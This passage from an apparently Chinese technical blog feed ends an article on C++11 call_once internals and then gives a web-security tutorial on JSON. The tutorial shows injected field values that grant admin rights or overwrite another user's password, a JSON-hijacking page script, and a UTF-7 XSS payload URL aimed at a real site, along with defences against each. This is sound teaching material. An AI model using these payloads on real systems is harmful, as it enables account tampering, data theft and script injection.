class="function"><span class="built_in">std</span>::thread <span class="title">t2</span><span class="params">(do_once)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t3</span><span class="params">(do_once)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t4</span><span class="params">(do_once)</span></span>;</span><br><span class="line"> </span><br><span class="line">    t1.join();</span><br><span class="line">    t2.join();</span><br><span class="line">    t3.join();</span><br><span class="line">    t4.join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存为main.cpp，如果是用g++或者clang++来编绎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g++ -std=c++11 -pthread main.cpp</span><br><span class="line">clang++ -std=c++11 -pthread main.cpp</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>
<p>可以看到，只会输出一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Called once</span><br></pre></td></tr></table></figure>
<p>值得注意的是，如果在函数执行中抛出了异常，那么会有另一个在once_flag上等待的线程会执行。</p>
<p>比如下面的例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">std</span>::once_flag flag;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">may_throw_function</span><span class="params">(<span class="keyword">bool</span> do_throw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// only one instance of this function can be run simultaneously</span></span><br><span class="line">  <span class="keyword">if</span> (do_throw) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"throw\n"</span>; <span class="comment">// this message may be printed from 0 to 3 times</span></span><br><span class="line">    <span class="comment">// if function exits via exception, another function selected</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">std</span>::exception();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"once\n"</span>; <span class="comment">// printed exactly once, it's guaranteed that</span></span><br><span class="line">      <span class="comment">// there are no messages after it</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">do_once</span><span class="params">(<span class="keyword">bool</span> do_throw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::call_once(flag, may_throw_function, do_throw);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t1</span><span class="params">(do_once, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t2</span><span class="params">(do_once, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t3</span><span class="params">(do_once, <span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t4</span><span class="params">(do_once, <span class="literal">true</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line">    t1.join();</span><br><span class="line">    t2.join();</span><br><span class="line">    t3.join();</span><br><span class="line">    t4.join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出的结果可能是0到3行throw，和一行once。</p>
<p><strong>实际上once_flag相当于一个锁，使用它的线程都会在上面等待，只有一个线程允许执行。如果该线程抛出异常，那么从等待中的线程中选择一个，重复上面的流程。</strong></p>
<h2 id="实现分析"><a href="#实现分析" class="headerlink" title="实现分析"></a>实现分析</h2><p>once_flag实际上只有一个unsigned long <strong>state_的成员变量，把call_once声明为友元函数，这样call_once能修改</strong>state__变量：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">once_flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        once_flag() _NOEXCEPT : __state_(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    once_flag(<span class="keyword">const</span> once_flag&amp;); <span class="comment">// = delete;</span></span><br><span class="line">    once_flag&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> once_flag&amp;); <span class="comment">// = delete;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> __state_;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> _<span class="title">Callable</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">friend</span> <span class="title">void</span> <span class="title">call_once</span>(<span class="title">once_flag</span>&amp;, _<span class="title">Callable</span>);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>call_once则用了一个__call_once_param类来包装函数，很常见的模板编程技巧。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Fp</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">call_once_param</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _Fp __f_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">explicit</span> __call_once_param(<span class="keyword">const</span> _Fp&amp; __f) : __f_(__f) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        __f_();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> _<span class="title">Callable</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">call_once</span>(<span class="title">once_flag</span>&amp; __<span class="title">flag</span>, _<span class="title">Callable</span> __<span class="title">func</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__flag.__state_ != ~<span class="number">0u</span>l)</span><br><span class="line">    &#123;</span><br><span class="line">        __call_once_param&lt;_Callable&gt; __p(__func);</span><br><span class="line">        __call_once(__flag.__state_, &amp;__p, &amp;__call_once_proxy&lt;_Callable&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最重要的是__call_once函数的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_mutex_t</span> mut = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_cond_t</span>  cv  = PTHREAD_COND_INITIALIZER;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__call_once(<span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>&amp; flag, <span class="keyword">void</span>* arg, <span class="keyword">void</span>(*func)(<span class="keyword">void</span>*))</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;mut);</span><br><span class="line">    <span class="keyword">while</span> (flag == <span class="number">1</span>)</span><br><span class="line">        pthread_cond_wait(&amp;cv, &amp;mut);</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBCPP_NO_EXCEPTIONS</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// _LIBCPP_NO_EXCEPTIONS</span></span></span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            pthread_mutex_unlock(&amp;mut);</span><br><span class="line">            func(arg);</span><br><span class="line">            pthread_mutex_lock(&amp;mut);</span><br><span class="line">            flag = ~<span class="number">0u</span>l;</span><br><span class="line">            pthread_mutex_unlock(&amp;mut);</span><br><span class="line">            pthread_cond_broadcast(&amp;cv);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBCPP_NO_EXCEPTIONS</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (...)</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_mutex_lock(&amp;mut);</span><br><span class="line">            flag = <span class="number">0u</span>l;</span><br><span class="line">            pthread_mutex_unlock(&amp;mut);</span><br><span class="line">            pthread_cond_broadcast(&amp;cv);</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// _LIBCPP_NO_EXCEPTIONS</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pthread_mutex_unlock(&amp;mut);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面用了全局的mutex和condition来做同步，还有异常处理的代码。<br>其实当看到mutext和condition时，就明白是如何实现的了。里面有一系列的同步操作，可以参考另外一篇blog：</p>
<ul>
<li><a href="http://blog.csdn.net/hengyunabc/article/details/27969613" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/27969613</a>   并行编程之条件变量（posix condition variables）</li>
</ul>
<p>尽管代码看起来很简单，但是要仔细分析它的各种时序也比较复杂。</p>
<p>有个地方比较疑惑的：</p>
<ul>
<li>对于同步的<strong>state</strong>变量，并没有任何的memory order的保护，会不会有问题？</li>
</ul>
<p>因为在JDK的代码里LockSupport和逻辑和上面的__call_once函数类似，但是却有memory order相关的代码：</p>
<p>OrderAccess::fence();</p>
<h2 id="其它的东东"><a href="#其它的东东" class="headerlink" title="其它的东东"></a>其它的东东</h2><p>有个东东值得提一下，在C++中，static变量的初始化，并不是线程安全的。</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> value = <span class="number">100</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上相当于这样的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">void</span> func()&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">if</span>(!__flag)&#123;</span><br><span class="line">        value = <span class="number">100</span>;</span><br><span class="line">        __flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还有一件事情要考虑：所有的once_flag和call_once都共用全局的mutex和condition会不会有性能问题？</p>
<p>首先，像call_once这样的需求在一个程序里不会太多。另外，临界区的代码是比较很少的，只有判断各自的flag的代码。</p>
<p>如果有上百上千个线程在等待once_flag，那么pthread_cond_broadcast可能会造成“惊群”效果，但是如果有那么多的线程都上等待，显然程序设计有问题。</p>
<p>还有一个要注意的地方是 <strong>once_flag的生命周期，它必须要比使用它的线程的生命周期要长。所以通常定义成全局变量比较好。</strong></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://libcxx.llvm.org/" target="_blank" rel="noopener">http://libcxx.llvm.org/</a></li>
<li><a href="http://en.cppreference.com/w/cpp/thread/once_flag" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp/thread/once_flag</a></li>
<li><a href="http://en.cppreference.com/w/cpp/thread/call_once" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp/thread/call_once</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈web安全之JSON</title>
    <url>/web-json-security/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://www.json.org/" target="_blank" rel="noopener">JSON</a>（JavaScript Object Notation），可以说是事实的浏览器，服务器交换数据的标准了。目测其它的格式如XML，或者其它自定义的格式会越来越少。</p>
<p>为什么JSON这么流行？<br>和JavaScript无缝对接是一个原因。</p>
<p>还有一个重要原因是可以比较轻松的实现跨域。如果是XML，或者其它专有格式，则很难实现跨域，要通过flash之类来实现。</p>
<p>任何一种数据格式，如何解析处理不当，都会存在安全漏洞。下面扯谈下JSON相关的一些安全东东。<br>在介绍之前，先来提几个问题：</p>
<ul>
<li>为什么XMLHttpRequest要遵守同源策略？</li>
<li>XMLHttpRequest 请求会不会带cookie?</li>
<li><code>&lt;script scr=&quot;...&quot;&gt;</code> 的标签请求会不会带cookie？</li>
<li>向一个其它域名的网站提交一个form，会不会带cookie？</li>
<li>CORS请求能不能带cookie？</li>
</ul>
<h2 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h2><p>有的时候，可能是为了方便，有人会手动拼接下JSON，但是这种随手代码，却可能带来意想不到的安全隐患。</p>
<h3 id="利用字符串拼接"><a href="#利用字符串拼接" class="headerlink" title="利用字符串拼接"></a>利用字符串拼接</h3><p>第一种方式，利用字符串拼接：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String user = <span class="string">"test01"</span>;</span><br><span class="line">String password = <span class="string">"12345', admin:'true"</span>;</span><br><span class="line">String json = <span class="string">"&#123;user:'%s', password:'%s'&#125;"</span>;</span><br><span class="line">System.out.println(String.format(json, user, password));</span><br><span class="line"><span class="comment">//&#123;user:'test01', password:'12345', admin:'true'&#125;</span></span><br></pre></td></tr></table></figure>
<p>用户增加了管理员权限。</p>
<h3 id="利用Parameter-pollution，-类似http-parameter-pollution"><a href="#利用Parameter-pollution，-类似http-parameter-pollution" class="headerlink" title="利用Parameter pollution， 类似http parameter pollution"></a>利用Parameter pollution， 类似http parameter pollution</h3><p>第二种，利用Parameter pollution， 类似http parameter pollution</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String string = <span class="string">"&#123;user:'test01',password:'hello', password:'world'&#125;"</span>;</span><br><span class="line">JSONObject parse = JSON.parseObject(string);</span><br><span class="line">String password = parse.getString(<span class="string">"password"</span>);</span><br><span class="line">System.out.println(password);</span><br><span class="line"><span class="comment">//world</span></span><br></pre></td></tr></table></figure>
<p>当JSON数据key重复了会怎么处理？大部分JSON解析库都是后面的参数覆盖了前面的。</p>
<p>下面的演示了修改别人密码的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//user%3Dtest01%26password%3D12345%27%2Cuser%3Dtest02"</span></span><br><span class="line"><span class="comment">//user=test01&amp;password=12345',user=test02</span></span><br><span class="line">HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">String user = request.getParameter(<span class="string">"user"</span>);</span><br><span class="line"><span class="comment">//检查test01是否登陆</span></span><br><span class="line">String password = request.getParameter(<span class="string">"password"</span>);</span><br><span class="line">String content = <span class="string">"&#123;user:'"</span> + user + <span class="string">"', password:'"</span> + password + <span class="string">"'&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">User user = JSON.parseObject(content, User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//&#123;"password":"12345","user":"test02"&#125;</span></span><br><span class="line">updateDb(user);</span><br></pre></td></tr></table></figure>
<p><strong>所以说，不要手动拼接JSON字符串</strong></p>
<h2 id="浏览器端应该如何处理JSON数据？"><a href="#浏览器端应该如何处理JSON数据？" class="headerlink" title="浏览器端应该如何处理JSON数据？"></a>浏览器端应该如何处理JSON数据？</h2><p>像eval这种方式，自然是不能采用的。</p>
<p>现在的浏览器都提供了原生的方法 JSON.parse(str) 来转换为JS对象。</p>
<p>如果是IE8之前的浏览器，要使用这个库来解析：<a href="https://github.com/douglascrockford/JSON-js" target="_blank" rel="noopener">https://github.com/douglascrockford/JSON-js</a><br>参考：<a href="http://zh.wikipedia.org/wiki/JSON#.E5.AE.89.E5.85.A8.E6.80.A7.E5.95.8F.E9.A1.8C" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/JSON#.E5.AE.89.E5.85.A8.E6.80.A7.E5.95.8F.E9.A1.8C</a></p>
<p>JQuery里内置了JSON解析库</p>
<h2 id="JSONP-callback注入"><a href="#JSONP-callback注入" class="headerlink" title="JSONP callback注入"></a>JSONP callback注入</h2><h3 id="jsonp工作原理"><a href="#jsonp工作原理" class="headerlink" title="jsonp工作原理"></a>jsonp工作原理</h3><p>简单介绍jsonp的工作原理。</p>
<p>用js在document上插入一个&lt;<code>script&gt;</code>标签，标签的src指向远程服务器的API地址。客户端和服务器约定一个回调函数的名字，然后服务器返回回调函数包裹着的数据，然后浏览器执行回调函数，取得数据。</p>
<p>比如jquery是这样子实现的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">'http://localhost:8080/testJsonp?callback=?'</span>;</span><br><span class="line">$.getJSON(url, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>jquery自动把?转成了一个带时间戳特别的函数（防止缓存）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/testJsonp?callback=jQuery1102045087050669826567_1386230674292&amp;_=1386230674293</span><br></pre></td></tr></table></figure>
<p>相当于插入了这么一个<code>&lt;script&gt;</code>标签：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://localhost:8080/testJsonp?callback=jQuery1102045087050669826567_1386230674292&amp;_=1386230674293"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器返回的数据是这样子的：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">jQuery1102045087050669826567_1386230674292(&#123;'name':'abc', 'age':18&#125;)</span><br></pre></td></tr></table></figure>
<p>浏览器会执行直接执行这个JS函数。</p>
<p><strong>所以，如果在callback函数的名字上做点手脚，可以执行任意的JS代码。所以说callback名字一定要严格过滤。</strong></p>
<p>当然，callback函数的名字通常是程序自己控制的，但是不能排除有其它被利用的可能。<br>那么callback函数的名字，如何过滤？应当只允许合法的JS函数命名，用正则来匹配应该是这样子的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^[0-9a-zA-Z_.]+$</span><br></pre></td></tr></table></figure>
<p>正则可能比较慢，可以写一个函数来判断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkJSONPCallbackName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">byte</span> c : name.getBytes(<span class="string">"US-ASCII"</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>) || (c &gt;= <span class="string">'a'</span> &amp;&amp; c &lt;= <span class="string">'z'</span>) || (c &gt;= <span class="string">'A'</span> &amp;&amp; c &lt;= <span class="string">'Z'</span>) || c == <span class="string">'_'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上对callback函数名字进行严格检验还有其它的一个好处，就是防范了很多UTF-7编码攻击。</p>
<p>因为UTF-7编码的头部都是带有特殊字符的，如”+/v8”，”+/v9”，这样就过滤掉非法编码的请求了。</p>
<p>update: 2016-3-22 </p>
<p>spring 4.1里有一个AbstractJsonpResponseBodyAdvice ，里面是用正则匹配来判断是否合法的jsonp函数名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractJsonpResponseBodyAdvice</span> <span class="keyword">extends</span> <span class="title">AbstractMappingJacksonResponseBodyAdvice</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Pattern for validating jsonp callback parameter values.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern CALLBACK_PARAM_PATTERN = Pattern.compile(<span class="string">"[0-9A-Za-z_\\.]*"</span>);</span><br></pre></td></tr></table></figure>
<h2 id="jsonp的请求的验证"><a href="#jsonp的请求的验证" class="headerlink" title="jsonp的请求的验证"></a>jsonp的请求的验证</h2><p>jsonp在使用的时候，还有容易犯的错误是没有验证用户的身份。</p>
<p><strong>第一，操作是否是用户自己提交的，而不是别的网页用<code>&lt;script&gt;</code>标签，或者用<code>&lt;form&gt;</code>提交的</strong></p>
<p>所以要检查request的refer，或者验证token。这个实际是CSRF防护的范畴，但是很容易被忽略。</p>
<p><strong>第二，要验证用户的权限。</strong></p>
<p>很多时候，可能只是验证了用户是否登录 。却没有仔细判断用户是否有权限。</p>
<p>比如通过JSONP请求修改了别的用户的数据。<br>所以说，一定要难证来源。判断refer，验证用户的身份。</p>
<p>到乌云上搜索，可以找到不少类似的漏洞，都是因为没有严格验证用户的权限。<a href="http://www.wooyun.org/searchbug.php?q=jsonp" target="_blank" rel="noopener">http://www.wooyun.org/searchbug.php?q=jsonp</a></p>
<h2 id="JSON-hijacking"><a href="#JSON-hijacking" class="headerlink" title="JSON hijacking"></a>JSON hijacking</h2><p>在JS里可以为对象定义一些setter函数，这样的话就存在了可以利用的漏洞。<br>比如在浏览器的JS Console里执行：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.__defineSetter__(<span class="string">'x'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">alert(<span class="string">'x is being assigned!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">window</span>.x=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>会很神奇地弹出一个alert窗口，说明我们定义的setter函数起作用了。<br>结合这个，当利用<code>&lt;script&gt;</code>标签请求外部的一个JSON API时，如果返回的是数组型，就可以利用窃取数据。</p>
<p>比如有这样的一个API：<br><a href="http://www.test.com/friends" target="_blank" rel="noopener">http://www.test.com/friends</a></p>
<p>返回的数据是JSON Array：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[&#123;'user':'test01','age':18&#125;,&#123;'user':'test02,'age':19&#125;,&#123;'user':'test03','age':20&#125;]</span><br></pre></td></tr></table></figure>
<p>在攻击页面上插入以下的代码，就可以获取到用户的所有的朋友的信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">Object</span>.prototype.__defineSetter__(<span class="string">'user'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span></span></span><br><span class="line">      &#123;alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/friends"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个漏洞在前几年很流行，比如qq邮箱的一个漏洞：<a href="http://www.wooyun.org/bugs/wooyun-2010-046" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-046</a></p>
<p>现在的浏览器都已经修复了，可以下载一个Firefox3.0版本来测试下。目前的浏览器在解析JSON Array字符串的时候，不再去触发setter函数了。但对于object.xxx 这样的设置，还是会触发。</p>
<h2 id="IE的utf-7编码解析问题"><a href="#IE的utf-7编码解析问题" class="headerlink" title="IE的utf-7编码解析问题"></a>IE的utf-7编码解析问题</h2><p>这个漏洞也曾经很流行。利用的是老版的IE可以解析utf-7编码的字符串或者文件，绕过服务器的过滤。举个乌云上的例子：<a href="http://www.wooyun.org/bugs/wooyun-2011-01293" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2011-01293</a><br>有这样的一个jsonp调用接口：</p>
<p><a href="http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg" target="_blank" rel="noopener">http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg</a></p>
<p>url decoder之后是：</p>
<p><a href="http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=+/v8" target="_blank" rel="noopener">http://jipiao.taobao.com/hotel/remote/livesearch.do?callback=+/v8</a> +ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg</p>
<p>因为jsonp调用是直接返回callback包装的数据，所以实际上，上面的请求直接返回的是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+/v8 +ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-(调用结果数据)</span><br></pre></td></tr></table></figure>
<p>IE做了UTF-7解码之后数据是这样子的：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">htm</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">htm</span>&gt;</span>(调用结果数据)</span><br></pre></td></tr></table></figure>
<p>于是，就执行了XSS。<br>另外用IFrame也是可以的。但是我在IE8上测试，url的后缀需要是html才会触发。<br>IE把没有声明返回Content-Type的请求当做了”text/html”类型的，然后解析就有问题了。</p>
<p><strong>只要服务器端显式设置了Content-Type为”application/json”，则IE不会识别编码，就不会触发漏洞。所以说服务器端的Content-Type一定要设置对。</strong>尽管设置之后调试有点麻烦，但是却大大提高了安全性。</p>
<ul>
<li>JSON格式设置为：”application/json”</li>
<li>JavaScript设置为：”application/x-javascript”</li>
<li>JavaScript还有一些设置为：”text/javascript”等，都是不规范的。</li>
</ul>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><p>这个实际上就是JSON注入，简单的字符串拼接，可能会引发各种数据被修改的问题。</p>
<h3 id="JSON解析库的问题"><a href="#JSON解析库的问题" class="headerlink" title="JSON解析库的问题"></a>JSON解析库的问题</h3><p>有些JSON库解析库支持循环引用，那么是否可以构造特别的数据，导致其解析失败？从而引起CPU使用过高，拒绝服务等问题？</p>
<p>FastJSON的一个StackOverflowError Bug：</p>
<p><a href="https://github.com/alibaba/fastjson/issues/76" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/76</a></p>
<p>有些JSON库解析有问题：</p>
<p><a href="http://www.freebuf.com/articles/web/10672.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/10672.html</a></p>
<h3 id="JSON-P"><a href="#JSON-P" class="headerlink" title="JSON-P"></a>JSON-P</h3><p>有人提出一个JSON-P的规范，但是貌似目前都没有浏览器有支持这个的。<br>原理是对于JSONP请求，浏览器可以要求服务器返回的MIME是”application/json-p”，这样可以严格校验是否合法的JSON数据。</p>
